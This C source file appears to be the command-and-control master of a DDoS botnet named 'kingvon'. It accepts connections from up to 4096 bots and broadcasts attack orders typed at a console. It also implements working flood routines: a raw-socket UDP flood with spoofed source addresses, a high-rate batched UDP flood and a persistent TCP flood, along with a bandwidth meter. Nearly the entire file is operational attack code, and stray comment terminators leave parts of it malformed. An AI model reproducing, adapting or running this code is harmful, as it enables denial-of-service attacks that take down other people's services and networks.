
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#include <ctype.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include "c2proto.h"

#define BATCH      256
#define PAYLOAD    1452            /* 1500 MTU - 20 IP - 8 UDP - headroom */
#define PKT_BYTES  (PAYLOAD + 28)
#define TCPSZ      (64 * 1024)      /* big writes = fewer syscalls */
#define SOCKBUF    (16 * 1024 * 1024)
#define MAXBOTS    4096

static char target_ip[64];
static uint16_t target_port;
static int duration;
static int use_mode;
static int n_threads;
static volatile int stop_flag = 0;
static volatile int attacking = 0;

static _Atomic unsigned long long g_bytes, g_pkts;
static uint64_t meter_prev = 0;

/* SO_SNDBUF is silently capped at net.core.wmem_max; SO_SNDBUFFORCE
 * (CAP_NET_ADMIN) gets the real size, with graceful fallback */
static void set_sndbuf(int fd) {
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUFFORCE, (int[]){SOCKBUF}, sizeof(int)) < 0)
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, (int[]){SOCKBUF}, sizeof(int));
}

static int auto_threads(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    if (n < 1) n = 1;
    if (n > C2_MAXTHREADS) n = C2_MAXTHREADS;
    return (int)n;
}

static uint64_t flood_raw(void) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) { perror("raw socket"); return 0; }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    set_sndbuf(fd);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char packets[BATCH][sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD];
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    srand(time(NULL) ^ pthread_self());
    for (int i = 0; i < BATCH; i++) {
        size_t total = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD;
        for (int j = sizeof(struct iphdr) + sizeof(struct udphdr); j < (int)total; j++)
            packets[i][j] = rand() & 0xFF;
        iovs[i].iov_base = packets[i];
        iovs[i].iov_len = total;
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    }
    uint64_t pkts = 0;
    time_t start = time(NULL);
    uint32_t fake_src = rand();
    while (!stop_flag && (time(NULL) - start) < duration) {
        for (int i = 0; i < BATCH; i++) {
            struct iphdr *ip = (struct iphdr *)packets[i];
            struct udphdr *udp = (struct udphdr *)(packets[i] + sizeof(struct iphdr));
            fake_src += 0x01010101;
            uint16_t sport = 1024 + (rand() % 64511);
            ip->version  = 4;
            ip->ihl      = 5;
            ip->tos      = 0;
            ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD);
            ip->id       = htons(rand() & 0xFFFF);
            ip->frag_off = htons(0x4000);
            ip->ttl      = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr    = fake_src;
            ip->daddr    = dst.sin_addr.s_addr;
            ip->check    = 0;
            udp->source = htons(sport);
            udp->dest   = htons(target_port);
            udp->len    = htons(sizeof(struct udphdr) + PAYLOAD);
            udp->check  = 0;
            iovs[i].iov_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD;
        }
        int n = sendmmsg(fd, msgs, BATCH, 0);
        if (n > 0) {
            pkts += n;
            g_pkts += n;
            g_bytes += (unsigned long long)n * PKT_BYTES;
        }
    }
    close(fd);
    return pkts;
}

static uint64_t flood_udp(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); return 0; }
    set_sndbuf(fd);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    static __thread unsigned char payload[PAYLOAD];
    for (int i = 0; i < PAYLOAD; i++) payload[i] = rand() & 0xFF;
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iovs[i].iov_base = payload;
        iovs[i].iov_len = PAYLOAD;
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    }
    uint64_t pkts = 0;
    time_t start = time(NULL);
    while (!stop_flag && (time(NULL) - start) < duration) {
        int n = sendmmsg(fd, msgs, BATCH, 0);
        if (n > 0) {
            pkts += n;
            g_pkts += n;
            g_bytes += (unsigned long long)n * PKT_BYTES;
        }
    }
    close(fd);
    return pkts;
}

/* TCP: persistent connections, spam data, reconnect on error */
static uint64_t flood_tcp(void) {
    static __thread unsigned char buf[TCPSZ];
    srand(time(NULL) ^ pthread_self());
    for (int i = 0; i < TCPSZ; i++) buf[i] = rand() & 0xFF;
    uint64_t pkts = 0, bytes = 0;
    time_t start = time(NULL);
    while (!stop_flag && (time(NULL) - start) < duration) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) break;
        set_sndbuf(fd);
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (int[]){1}, sizeof(int));
        struct sockaddr_in dst = {0};
        dst.sin_family = AF_INET;
        dst.sin_port = htons(target_port);
        dst.sin_addr.s_addr = inet_addr(target_ip);
        /* non-blocking connect with timeout */
        int fl = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0 && errno != EINPROGRESS) {
            close(fd); break;
        }
        struct pollfd pfd = { .fd = fd, .events = POLLOUT };
        if (poll(&pfd, 1, 5000) != 1 || !(pfd.revents & POLLOUT)) { close(fd); continue; }
        fcntl(fd, F_SETFL, fl);
        while (!stop_flag && (time(NULL) - start) < duration) {
            ssize_t n = send(fd, buf, TCPSZ, MSG_NOSIGNAL);
            if (n > 0) {
                bytes += (uint64_t)n;
                pkts  += (uint64_t)(n + 1439) / 1440; /* approx MSS segments */
            } else {
                if (n < 0 && (errno == EINTR || errno == EAGAIN)) continue;
                break; /* conn dead, reconnect */
            }
        }
        close(fd);
    }
    g_pkts  += pkts;
    g_bytes += bytes + pkts * 52ULL; /* + TCP/IP hdr per segment */
    return pkts;
}

static void *worker(void *arg) {
    uint64_t n = 0;
    if (use_mode == C2_MODE_SPOOF)      n = flood_raw();
    else if (use_mode == C2_MODE_TCP)   n = flood_tcp();
    else                                 n = flood_udp();
    printf("[kingvon thread %ld] sent %llu pkts\n", (long)arg, (unsigned long long)n);
    return NULL;
}

static void *attack_runner(void *arg) {
    (void)arg;
    const char *m = use_mode == C2_MODE_SPOOF ? "spoof" :
                    use_mode == C2_MODE_TCP   ? "tcp"   : "udp";
    if (use_mode == C2_MODE_SPOOF && geteuid() != 0)
        printf("[kingvon] WARNING: spoof set but not root, raw socket will fail\n");
    printf("[kingvon] LOCAL ATTACK -> %s:%u | %ds | %d threads | mode=%s\n",
           target_ip, target_port, duration, n_threads, m);
    pthread_t tids[C2_MAXTHREADS];
    int t = n_threads > C2_MAXTHREADS ? C2_MAXTHREADS : n_threads;
    for (int i = 0; i < t; i++)
        pthread_create(&tids[i], NULL, worker, (void *)(long)i);
    for (int i = 0; i < t; i++)
        pthread_join(tids[i], NULL);
    printf("[kingvon] local attack finished\n");
    attacking = 0;
    return NULL;
}

typedef struct {
    int      fd;
    char     ip[INET_ADDRSTRLEN];
    uint64_t bytes;
    uint64_t pkts;
    uint8_t  state;
} bot_t;

static bot_t bots[MAXBOTS];
static int   nbots = 0;
static volatile sig_atomic_t run = 1;

static void on_signal(int s) { (void)s; run = 0; }

static void remove_bot(int i) {
    printf("[master] bot %s disconnected\n", bots[i].ip);
    close(bots[i].fd);
    bots[i] = bots[nbots - 1];
    nbots--;
}

static void add_bot(int fd, struct sockaddr_in *sa) {
    if (nbots >= MAXBOTS) { close(fd); return; }
    bots[nbots].fd = fd;
    bots[nbots].bytes = 0;
    bots[nbots].pkts  = 0;
    bots[nbots].state = 0;
    inet_ntop(AF_INET, &sa->sin_addr, bots[nbots].ip, sizeof(bots[nbots].ip));
    printf("[master] bot connected: %s (total: %d)\n", bots[nbots].ip, nbots + 1);
    nbots++;
}

static int send_all_fd(int fd, const void *buf, size_t len) {
    const char *p = buf;
    while (len > 0) {
        ssize_t n = send(fd, p, len, MSG_NOSIGNAL);
        if (n < 0) { if (errno == EINTR) continue; return -1; }
        p += n; len -= (size_t)n;
    }
    return 0;
}

static void broadcast(c2_pkt_t *pkt) {
    for (int i = nbots - 1; i >= 0; i--) {
        if (send_all_fd(bots[i].fd, pkt, sizeof(*pkt)) < 0)
            remove_bot(i);
        else
            printf("[master] sent to %s\n", bots[i].ip);
    }
}

/* static void start_local_attack(void) {
    if (attacking) {
        stop_flag = 1;
        while (attacking) usleep(50000);
    }
    stop_flag = 0;
    attacking  = 1;
    pthread_t r;
    pthread_create(&r, NULL, attack_runner, NULL);
    pthread_detach(r);
} */

static void handle_stdin(char *line) {
    c2_pkt_t p;
    memset(&p, 0, sizeof(p));
    p.magic = C2_MAGIC;

    if (strncmp(line, "attack", 6) == 0) {
        char *save = NULL;
        char *tok_ip   = strtok_r(line + 6, " \t\r\n", &save);
        char *tok_port = strtok_r(NULL, " \t\r\n", &save);
        char *tok_dur  = strtok_r(NULL, " \t\r\n", &save);
        char *tok_a    = strtok_r(NULL, " \t\r\n", &save);
        char *tok_b    = strtok_r(NULL, " \t\r\n", &save);

        if (!tok_ip || !tok_port || !tok_dur) {
            printf("usage: attack <ip> <port> <sec> [udp|tcp|spoof] [threads]\n");
            return;
        }
        strncpy(p.ip, tok_ip, sizeof(p.ip) - 1);
        unsigned port_ = atoi(tok_port), dur = atoi(tok_dur);
        if (!port_ || !dur) { printf("bad port/duration\n"); return; }
        p.port = (uint16_t)port_;
        p.duration = dur;

        p.mode = C2_MODE_UDP;
        unsigned thr = 0;  /* 0 = auto (nproc) */
        /* token 4: mode word OR thread count */
        if (tok_a) {
            if (isdigit((unsigned char)tok_a[0])) thr = atoi(tok_a);
            else if (strcmp(tok_a, "udp") == 0)   p.mode = C2_MODE_UDP;
            else if (strcmp(tok_a, "spoof") == 0) p.mode = C2_MODE_SPOOF;
            else if (strcmp(tok_a, "tcp") == 0)    p.mode = C2_MODE_TCP;
            else { printf("unknown mode '%s' (udp|tcp|spoof)\n", tok_a); return; }
            /* token 5: thread count if token 4 was mode */
            if (tok_b) {
                if (!isdigit((unsigned char)tok_b[0])) { printf("bad threads: %s\n", tok_b); return; }
                thr = atoi(tok_b);
            }
        }
        if (thr > C2_MAXTHREADS) thr = C2_MAXTHREADS;
        p.type = C2_CMD_ATTACK;
        p.threads = (uint16_t)thr;

        int local_thr = thr ? (int)thr : auto_threads();

        g_bytes = 0;
        g_pkts  = 0;
        meter_prev = 0;
        for (int i = 0; i < nbots; i++) {
            bots[i].bytes = 0;
            bots[i].pkts  = 0;
            bots[i].state = 0;
        }

        strncpy(target_ip, p.ip, sizeof(target_ip) - 1);
        target_port = p.port;
        duration    = (int)p.duration;
        use_mode    = p.mode;
        n_threads   = local_thr;
        /* start_local_attack(); master stays idle */

        const char *m = p.mode == C2_MODE_SPOOF ? "spoof" :
                        p.mode == C2_MODE_TCP   ? "tcp"   : "udp";
        printf("[master] ATTACK %s:%u %us mode=%s threads=%d(auto nproc) | self + %d bots\n",
               p.ip, p.port, p.duration, m, local_thr, nbots);
        broadcast(&p);
    }
    else if (strncmp(line, "stop", 4) == 0) {
        stop_flag = 1;
        printf("[master] STOP -> self + %d bots\n", nbots);
        p.type = C2_CMD_STOP;
        broadcast(&p);
    }
    else if (strncmp(line, "list", 4) == 0) {
        printf("[master] self (attacking=%d) + %d bots online:\n", attacking, nbots);
        for (int i = 0; i < nbots; i++)
            printf("  [%d] %s  bytes=%llu pkts=%llu attacking=%d\n", i, bots[i].ip,
                   (unsigned long long)bots[i].bytes,
                   (unsigned long long)bots[i].pkts, bots[i].state);
    }
    else if (strncmp(line, "quit", 4) == 0) {
        run = 0;
    }
    else if (line[0] != '\n') {
        printf("commands: attack <ip> <port> <sec> [udp|tcp|spoof] [threads] | stop | list | quit\n");
    }
}

int main(int argc, char **argv) {
    int port = (argc > 1) ? atoi(argv[1]) : C2_PORT_DEFAULT;

    signal(SIGINT, on_signal);
    signal(SIGPIPE, SIG_IGN);

    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) { perror("socket"); return 1; }
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;
    if (bind(lfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { perror("bind"); return 1; }
    if (listen(lfd, 16) < 0) { perror("listen"); return 1; }

    printf("[kingvon] Master+Worker listening on port %d\n", port);
    printf("[kingvon] attack <ip> <port> <sec> [udp|tcp|spoof] [threads]  (threads omitted = nproc)\n");
    printf("[kingvon] [meter] prints fleet-wide Gbps every second\n");

    time_t last_sec = time(NULL);

    while (run) {
        struct pollfd pfds[MAXBOTS + 2];
        int n = 0;
        pfds[n].fd = lfd;          pfds[n++].events = POLLIN;
        pfds[n].fd = STDIN_FILENO; pfds[n++].events = POLLIN;
        for (int i = 0; i < nbots; i++) {
            pfds[n].fd = bots[i].fd;
            pfds[n++].events = POLLIN;
        }

        if (poll(pfds, (nfds_t)n, 1000) < 0) {
            if (errno == EINTR) continue;
            perror("poll"); break;
        }

        for (int i = 0; i < n && run; i++) {
            if (!(pfds[i].revents & POLLIN)) continue;

            if (pfds[i].fd == lfd) {
                struct sockaddr_in sa;
                socklen_t sl = sizeof(sa);
                int cfd = accept(lfd, (struct sockaddr *)&sa, &sl);
                if (cfd >= 0) add_bot(cfd, &sa);
            }
            else if (pfds[i].fd == STDIN_FILENO) {
                char line[256];
                if (fgets(line, sizeof(line), stdin))
                    handle_stdin(line);
            }
            else {
                char buf[sizeof(c2_stats_t) * 4];
                ssize_t r = recv(pfds[i].fd, buf, sizeof(buf), 0);
                if (r <= 0) {
                    for (int b = 0; b < nbots; b++)
                        if (bots[b].fd == pfds[i].fd) { remove_bot(b); break; }
                }
                else {
                    c2_stats_t *s = (c2_stats_t *)buf;
                    if ((size_t)r >= sizeof(c2_stats_t) && s->magic == C2_MAGIC && s->type == C2_CMD_STATS) {
                        for (int b = 0; b < nbots; b++)
                            if (bots[b].fd == pfds[i].fd) {
                                bots[b].bytes = s->bytes;
                                bots[b].pkts  = s->pkts;
                                bots[b].state = s->state;
                                break;
                            }
                    }
                }
            }
        }

// remove these commentd if u wanna see the meter

*/
        time_t now = time(NULL);
        if (now != last_sec) {
            last_sec = now;
            uint64_t tot = 0, tpkts = 0;
            int busy = attacking ? 1 : 0;
            for (int i = 0; i < nbots; i++) {
                tot += bots[i].bytes;
                tpkts += bots[i].pkts;
                if (bots[i].state) busy++;
            }
            tot += g_bytes;
            tpkts += g_pkts;
            unsigned long long delta = tot - meter_prev;
            printf("[meter] %7.2f Gbps | %10.2f GB total | %12llu pkts | %d attacking\n",
                   (double)delta * 8.0 / 1e9,
                   (double)tot / 1e9,
                   (unsigned long long)tpkts,
                   (busy));
            fflush(stdout);
            meter_prev = tot;
        };
    }
*/
    stop_flag = 1;
    while (attacking) usleep(5000000);

    c2_pkt_t stop;
    memset(&stop, 0, sizeof(stop));
    stop.magic = C2_MAGIC;
    stop.type  = C2_CMD_STOP;
    broadcast(&stop);

    for (int i = 0; i < nbots; i++) close(bots[i].fd);
    close(lfd);
    printf("[kingvon] shutdown\n");
    return 0;
}
